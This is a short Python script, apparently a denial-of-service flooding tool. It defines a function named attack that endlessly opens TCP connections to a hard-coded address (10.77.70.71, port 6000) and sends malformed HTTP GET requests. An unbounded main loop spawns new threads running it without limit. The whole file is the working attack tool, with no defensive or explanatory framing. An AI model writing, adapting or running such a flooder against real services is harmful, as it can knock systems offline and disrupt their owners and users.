import threading
import socket, sys, os

def attack():
    while True:
        # pid = os.fork()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("10.77.70.71", 6000))
            #print(">> GET / HTTP/1.1")
            s.send(b"GET / \r\n")
            s.send(b"Host: http://10.77.70.71:5000 \r\n\r\n");
            s.close()
        except (TimeoutError,ConnectionRefusedError,OSError):
            print('errored')
            pass

x=0

while True:
    x+=1
    print('THREAD:')
    print(x)
    e1 = threading.Event()
    t1 = threading.Thread(target=attack)
    t1.start()
